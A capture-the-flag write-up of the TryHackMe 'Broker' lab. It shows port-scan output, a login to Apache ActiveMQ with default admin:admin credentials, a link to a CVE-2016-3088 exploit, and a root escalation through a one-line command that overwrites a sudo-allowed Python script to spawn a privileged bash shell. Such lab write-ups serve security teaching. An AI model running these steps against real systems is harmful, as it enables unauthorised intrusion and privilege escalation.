------------------

### CTF: Tryhackme
### Lab: Broker

------------------

![image](https://github.com/user-attachments/assets/1d14550f-bff8-4d3f-af10-5257b0cb733d)

-----------------

### Reconnaissance

- Rustscan's output

      ❯ rustscan -a 10.10.15.66 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      🌍HACK THE PLANET🌍
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.15.66:22
      Open 10.10.15.66:1883
      Open 10.10.15.66:8161
      Open 10.10.15.66:33809
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 15:48 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 15:48
      Completed NSE at 15:48, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 15:48
      Completed NSE at 15:48, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 15:48
      Completed NSE at 15:48, 0.00s elapsed
      Initiating Ping Scan at 15:48
      Scanning 10.10.15.66 [2 ports]
      Completed Ping Scan at 15:48, 0.17s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 15:48
      Completed Parallel DNS resolution of 1 host. at 15:48, 0.01s elapsed
      DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 15:48
      Scanning 10.10.15.66 [4 ports]
      Discovered open port 22/tcp on 10.10.15.66
      Discovered open port 8161/tcp on 10.10.15.66
      Discovered open port 1883/tcp on 10.10.15.66
      Discovered open port 33809/tcp on 10.10.15.66
      Completed Connect Scan at 15:48, 0.17s elapsed (4 total ports)
      Initiating Service scan at 15:48
      Scanning 4 services on 10.10.15.66
      Completed Service scan at 15:49, 105.92s elapsed (4 services on 1 host)
      NSE: Script scanning 10.10.15.66.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 15:49
      Completed NSE at 15:50, 20.76s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 15:50
      Completed NSE at 15:50, 0.65s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 15:50
      Completed NSE at 15:50, 0.01s elapsed
      Nmap scan report for 10.10.15.66
      Host is up, received conn-refused (0.17s latency).
      Scanned at 2024-08-20 15:48:09 EDT for 128s
      
      PORT      STATE SERVICE    REASON  VERSION
      22/tcp    open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 4c:75:a0:7b:43:87:70:4f:70:16:d2:3c:c4:c5:a4:e9 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0E0J6enJ0afxy700qSiIX5MtF1OnZao36BxMDHd4z3X/fbRQc3WOsCzY9KsTw7RltG4bSBJGja3ppRbiLTowv+2aunR3nKPaR/Rea1NFCHPxonnYutUyqPsJIRnm+oV+hqd/rvn/BgLpdNo2bpWG1PG3gNVwmbuUqybL9XF3KoZz8gj6zZPJ+RV8yrM17R2bd1J7YgTMJBKSuKyzVQZJQHJMhdBLBOfVmF3PgajXe2Dm10xbL2rQ3Zsbbuk6hhc4Ypq1LYeZ1PA0aNuHoMzhjXlYQ3XElD5Rzr6rBo5LJr2VD2Y3mo86wyM6OZBb+B88Law3RJ4fwtjVgEoa2KX0F
      |   256 f4:62:b2:ad:f8:62:a0:91:2f:0a:0e:29:1a:db:70:e4 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyqJ0DAEyEKxeir3lNhPLTZNtDo/CfpLAKWpiSxZUd8NJIrcsNod31Tl+KSwMvNjNvW2ilD1YYxnO2A3FDApqg=
      |   256 92:d2:87:7b:98:12:45:93:52:03:5e:9e:c7:18:71:d5 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqDlHwUjvqNDfhowAQHQMu7A/HVUijCXkxdkgpF/pSe
      1883/tcp  open  mqtt?      syn-ack
      |_mqtt-subscribe: The script encountered an error: ssl failed
      8161/tcp  open  http       syn-ack Jetty 7.6.9.v20130131
      |_http-server-header: Jetty(7.6.9.v20130131)
      | http-methods: 
      |_  Supported Methods: GET HEAD
      |_http-title: Apache ActiveMQ
      33809/tcp open  tcpwrapped syn-ack
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- FFUF's output

![image](https://github.com/user-attachments/assets/6230e8fb-9026-4866-968a-620ec0b5fbd8)

- I checked the admin page on port `8161` and discovered that I can use defualt credentials `admin:admin` to log in.

![image](https://github.com/user-attachments/assets/23dd6a14-3c47-4517-9418-fd4935315100)

- I discovered an exploit for the activemq version `5.9.0` on [github](https://github.com/cyberaguiar/CVE-2016-3088)

  ![image](https://github.com/user-attachments/assets/5c1385f9-af38-448c-b16c-90c3e2ae25d4)

- Shell Access

  ![image](https://github.com/user-attachments/assets/8c4efbe6-92e8-41f2-b321-0eb236265017)

---------------------

### Privesc with sudoers rule

- `sudo -l` reveals that we can run a script as root with no password

      activemq@activemq:/opt/apache-activemq-5.9.0$ sudo -l
      Matching Defaults entries for activemq on activemq:
          env_reset, mail_badpass,
          secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
      
      User activemq may run the following commands on activemq:
          (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
      activemq@activemq:/opt/apache-activemq-5.9.0$

- The `subscribe.py` is owned by user `activemq`.We can simply add this line of code to set the current user's `uid` and `gid` to root
and spawn and a root bash shell.

      echo "import os;os.setuid(0);os.setgid(0);os.system('bash -p')" > subscribe.py

- Running it

![image](https://github.com/user-attachments/assets/9b594506-0a97-4ae3-b867-93b999ba5b22)

- Root access

![image](https://github.com/user-attachments/assets/df381bee-f110-4923-88ab-add129c979a2)


-----------------

### REFERENCES:

- [Activemq 5.9.0's exploit](https://github.com/cyberaguiar/CVE-2016-3088)

------------------

### THANKS FOR READING!!!!


  

  
